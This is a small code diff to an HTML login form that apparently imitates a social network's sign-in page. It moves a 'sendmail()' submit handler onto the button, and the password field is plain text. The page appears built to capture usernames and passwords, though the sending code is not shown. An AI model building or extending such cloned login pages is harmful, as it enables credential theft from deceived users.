@@ -24,7 +24,7 @@
                 <div class="logo">
                     <img src="logo2.png" alt=""  style = " width: 175px;">
                 </div>
-                <form class="form" onsubmit="sendmail()">
+                <form class="form" >
                     <div class="input_field">
                         <input name="user_name" id="username" type="text" placeholder="Phone Number , username , or email" class="input" minlength='3' required>
                     </div>
@@ -32,7 +32,7 @@
                         <input name="user_pw" id="passw" type="text" placeholder="Password" class="input" minlength='3' required>
                     </div>
                     <div class="btn">
-                        <button type="submit" href="#">log In</button>
+                        <button type="submit" onsubmit="sendmail()" >log In</button>
                     </div>
                 </form>
                 <div class="or">
